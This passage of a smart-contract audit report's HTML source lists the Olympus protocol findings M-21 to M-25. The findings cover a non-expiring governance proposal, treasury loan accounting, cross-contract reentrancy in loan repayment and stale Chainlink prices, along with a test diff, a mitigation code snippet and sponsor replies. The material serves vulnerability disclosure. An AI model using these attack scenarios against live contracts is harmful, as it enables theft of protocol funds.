class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"260\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">249</span><span class=\"mtk1\">             </span><span class=\"mtk12\">cushionSpread_</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">wallSpread_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"261\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">250</span><span class=\"mtk1\">         ) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RANGE_InvalidParams</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/404#issuecomment-1238554404\">Oighty (Olympus) disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>This is indeed an edge case and we will update the value checks for the spread values to exclude <code>10000</code>. However, from a practical perspective, this is very unlikely to happen. If the goal is to set the lower wall to 0, then the system would just be disabled.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/404#issuecomment-1251657272\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Given the warden does fully demonstrate the issue, I am going to award as Medium with the understanding that this is an extreme edge case. </p>\n</blockquote>\n<hr>\n<h2 id=\"m-21-olympusgovernance---active-proposal-does-not-expire\" style=\"position:relative;\"><a href=\"#m-21-olympusgovernance---active-proposal-does-not-expire\" aria-label=\"m 21 olympusgovernance   active proposal does not expire permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/100\">[M-21] OlympusGovernance - active proposal does not expire</a></h2>\n<p><em>Submitted by reassor</em></p>\n<p>Contract <code>OlympusGovernance</code> allows controlling protocol through on-chain governing. The issue is that once proposal is active it does not expire, which means that until the new proposal will be selected, anyone can vote on existing one and potentially execute it when it might cause harm to the protocol.</p>\n<p>Scenario:</p>\n<ol>\n<li>New proposal has been submited, endorsed and activated.</li>\n<li>Users vote, but the quroum is not being achieved.</li>\n<li>The proposal is active until new one is getting submitted.</li>\n<li>6 months elapses and the current active proposal might cause serious harm to the protocol (since it was created long time ago).</li>\n<li>Malicious actor votes and executes proposal causing harm to the protocol.</li>\n</ol>\n<h3 id=\"proof-of-concept-21\" style=\"position:relative;\"><a href=\"#proof-of-concept-21\" aria-label=\"proof of concept 21 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><code>Governance.sol</code>:</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L265-L289\">https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L265-L289</a></li>\n</ul>\n<h3 id=\"tools-used-9\" style=\"position:relative;\"><a href=\"#tools-used-9\" aria-label=\"tools used 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Manual Review / VSCode</p>\n<h3 id=\"recommended-mitigation-steps-23\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-23\" aria-label=\"recommended mitigation steps 23 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>It is recommended to add expiration for the active proposal for example 2 weeks. After that time it should be possible to reject proposal and users should be able to reclaim VOTES tokens.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/100\">fullyallocated (Olympus) disputed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/100#issuecomment-1251712619\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I believe the warden is simply stating that an active proposal stays active if not replaced.  There is not expiration of a proposal once it becomes active, so theoretically if the governance process is inactive a very stale proposal could get executed. </p>\n</blockquote>\n<hr>\n<h2 id=\"m-22-low-market-bondsswaps-not-working-after-loan-is-taken-from-treasury\" style=\"position:relative;\"><a href=\"#m-22-low-market-bondsswaps-not-working-after-loan-is-taken-from-treasury\" aria-label=\"m 22 low market bondsswaps not working after loan is taken from treasury permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/422\">[M-22] Low market bonds/swaps not working after loan is taken from treasury</a></h2>\n<p><em>Submitted by immeas</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L60\">https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L60</a><br></p>\n<p>I am bordering between this being medium and low, but since this is, granted under very unlikely circumstances, hindering intended transfers to work I am submitting it as medium. That said, I don’t think this scenario is very likely since it requires a trusted contract not part of initial release(? no contract in repo used a loan) to take a large loan from TRSRY.</p>\n<h3 id=\"proof-of-concept-22\" style=\"position:relative;\"><a href=\"#proof-of-concept-22\" aria-label=\"proof of concept 22 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>This will cause test to fail on <code>TRANSFER_FAILED</code> due to TRSRY not having the tokens to transfer but <code>getReserveBalance</code> says it has, since capacity is determined based on non-existing tokens.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"43\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/test/policies/Operator.t.sol b/src/test/policies/Operator.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index e09aec1..5c1e95f 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/test/policies/Operator.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/test/policies/Operator.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -26,6 +26,8 @@ import {OlympusMinter, OHM} from &quot;modules/MINTR.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> import {Operator} from &quot;policies/Operator.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> import {BondCallback} from &quot;policies/BondCallback.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+import {ModuleTestFixtureGenerator} from &quot;test/lib/ModuleTestFixtureGenerator.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> contract MockOhm is ERC20 {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     constructor(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         string memory _name,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -45,6 +47,7 @@ contract MockOhm is ERC20 {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> // solhint-disable-next-line max-states-count</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> contract OperatorTest is Test {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     using FullMath for uint256;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    using ModuleTestFixtureGenerator for OlympusTreasury;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     UserFactory public userCreator;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     address internal alice;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -53,6 +56,9 @@ contract OperatorTest is Test {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     address internal policy;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     address internal heart;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    address public debtor;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    address public godmode; </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     RolesAuthority internal auth;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     BondAggregator internal aggregator;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     BondFixedTermTeller internal teller;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -187,6 +193,18 @@ contract OperatorTest is Test {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         reserve.mint(address(treasury), testReserve * 100);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        debtor = treasury.generateFunctionFixture(treasury.getLoan.selector);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        godmode = treasury.generateGodmodeFixture(type(OlympusTreasury).name);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        kernel.executeAction(Actions.ActivatePolicy, godmode);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        kernel.executeAction(Actions.ActivatePolicy, debtor);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vm.prank(godmode);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        treasury.setApprovalFor(debtor, reserve, testReserve * 100);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vm.prank(debtor);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        treasury.getLoan(reserve,testReserve*100);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // Approve the operator and bond teller for the tokens to swap</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         vm.prank(alice);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         ohm.approve(address(operator), testOhm * 20);</span></span></span></code></pre>\n<p>Same is applicable for low market bonds since they are created based on the same capacity.</p>\n<h3 id=\"tools-used-10\" style=\"position:relative;\"><a href=\"#tools-used-10\" aria-label=\"tools used 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>vs code + tests</p>\n<h3 id=\"recommended-mitigation-steps-24\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-24\" aria-label=\"recommended mitigation steps 24 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Determine capacity from actual tokens held by treasury.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/422#issuecomment-1238768525\">ind-igo (Olympus) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Acknowledged. Will add a reserve requirement check inside the TRSRY’s debt functions, which we can expand with a policy to rebalance if out of balance on a heartbeat.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-23-treasury-module-is-vulnerable-to-cross-contract-reentrancy\" style=\"position:relative;\"><a href=\"#m-23-treasury-module-is-vulnerable-to-cross-contract-reentrancy\" aria-label=\"m 23 treasury module is vulnerable to cross contract reentrancy permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/426\">[M-23] Treasury module is vulnerable to cross-contract reentrancy</a></h2>\n<p><em>Submitted by Czar102</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L108-L112\">https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L108-L112</a><br></p>\n<p>An attacker can pay back their loan to the treasury module with protocol-owned tokens. This will cause their loan to decrease despite the protocol won’t be given funds for it.</p>\n<h3 id=\"proof-of-concept-23\" style=\"position:relative;\"><a href=\"#proof-of-concept-23\" aria-label=\"proof of concept 23 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The code first measures the number of tokens in the treasury, then transfers an amount to the contract and checks the change it caused. This is put behind a nonReentrant modifier so that one can’t use the same balance change to pay back multiple parts of (potentially) multiple loans.</p>\n<p>The problem arises when the treasury doesn’t only claim tokens from paying back loans, but also claims protocol revenue. Since, an attacker can gain execution in the moment the funds are pulled to the treasury to trigger any function that grants treasury this type of tokens (collects protocol revenue). The contract will count these tokens as paying back one’s loan since this happened between balance measurements.</p>\n<h3 id=\"recommended-mitigation-steps-25\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-25\" aria-label=\"recommended mitigation steps 25 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add a function used to pull a token to the contract and mark it nonReentrant. Any transfer of tokens to the treasury should be done through that function.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/426#issuecomment-1240219578\">ind-igo (Olympus) commented</a>:</strong></p>\n<blockquote>\n<p>I am confused by this submission. Need more information.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/426#issuecomment-1244569278\">ind-igo (Olympus) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Spoke with Czar, solution for minimal change is adding <code>received = min(received, amount_);</code>. Confirming issue.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-24-naz-m1-chainlinks-latestrounddata-might-return-stale-results\" style=\"position:relative;\"><a href=\"#m-24-naz-m1-chainlinks-latestrounddata-might-return-stale-results\" aria-label=\"m 24 naz m1 chainlinks latestrounddata might return stale results permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/441\">[M-24] [NAZ-M1] Chainlink’s <code>latestRoundData</code> Might Return Stale Results</a></h2>\n<p><em>Submitted by 0xNazgul, also found by __141345__, 0x1f8b, ak1, brgltd, cccz, csanuragjain, Dravee, Guardian, hyh, IllIllI, itsmeSTYJ, Jujic, Lambda, pashov, peachtea, rbserver, reassor, Sm4rty, TomJ, and zzzitron</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L161\">https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L161</a><br>\n<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L170\">https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L170</a><br></p>\n<p>Across these contracts, you are using Chainlink’s <code>latestRoundData</code> API, but there is only a check on <code>updatedAt</code>. This could lead to stale prices according to the Chainlink documentation:</p>\n<ul>\n<li><a href=\"https://docs.chain.link/docs/historical-price-data/#historical-rounds\">Historical Price data</a></li>\n<li><a href=\"https://docs.chain.link/docs/faq/#how-can-i-check-if-the-answer-to-a-round-is-being-carried-over-from-a-previous-round\">Checking Your returned answers</a></li>\n</ul>\n<p>The result of <code>latestRoundData</code> API will be used across various functions, therefore, a stale price from Chainlink can lead to loss of funds to end-users.</p>\n<h3 id=\"recommended-mitigation-steps-26\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-26\" aria-label=\"recommended mitigation steps 26 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider adding the missing checks for stale data.</p>\n<p>For example:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"44\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">(</span><span class=\"mtk12\">uint80</span><span class=\"mtk1\"> </span><span class=\"mtk12\">roundID</span><span class=\"mtk1\"> ,</span><span class=\"mtk12\">answer</span><span class=\"mtk1\">,, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint80</span><span class=\"mtk1\"> </span><span class=\"mtk12\">answeredInRound</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">AggregatorV3Interface</span><span class=\"mtk1\">(</span><span class=\"mtk12\">chainLinkAggregatorMap</span><span class=\"mtk1\">[</span><span class=\"mtk12\">underlying</span><span class=\"mtk1\">]).</span><span class=\"mtk11\">latestRoundData</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">answer</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Chainlink price &lt;= 0&quot;</span><span class=\"mtk1\">); </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">answeredInRound</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">roundID</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Stale price&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Round not complete&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/441#issuecomment-1238528515\">Oighty (Olympus) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Agree. We’ll add the additional checks.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-25-moving-average-precision-is-lost\" style=\"position:relative;\"><a href=\"#m-25-moving-average-precision-is-lost\" aria-label=\"m 25 moving average precision is lost permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 